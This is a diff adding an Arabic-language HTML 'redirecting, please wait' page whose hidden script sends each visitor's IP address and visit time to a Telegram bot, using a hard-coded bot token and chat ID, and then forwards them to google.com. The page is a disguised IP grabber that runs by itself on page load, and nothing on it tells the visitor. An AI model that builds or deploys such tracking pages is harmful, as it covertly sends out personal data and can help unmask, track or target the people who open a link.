@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحويل...</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f4f4f9;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h3>جاري تحويلك إلى الصفحة المطلوبة...</h3>
+    <p>يرجى الانتظار قليلاً.</p>
+
+    <script>
+        // 1. رابط الموقع أو الصفحة التي تريد توجيه المستخدم إليها بعد تسجيل الأيبيه
+        const targetRedirectUrl = "https://www.google.com"; 
+
+        // 2. معلومات بوت التليجرام الخاص بك
+        const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
+        const chatId = "4463707354"; // تم وضع الـ Chat ID الخاص بك هنا
+
+        function captureAndSend() {
+            // جلب الـ IP الخاص بالزائر
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    const visitTime = new Date().toLocaleString();
+
+                    // تجهيز رسالة التليجرام
+                    const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+                    // إرسال البيانات إلى بوت التليجرام في الخلفية
+                    fetch(telegramUrl)
+                        .then(() => {
+                            window.location.href = targetRedirectUrl;
+                        })
+                        .catch(() => {
+                            window.location.href = targetRedirectUrl;
+                        });
+                })
+                .catch(error => {
+                    window.location.href = targetRedirectUrl;
+                });
+        }
+
+        window.onload = captureAndSend;
+    </script>
+
+</body>
+</html>
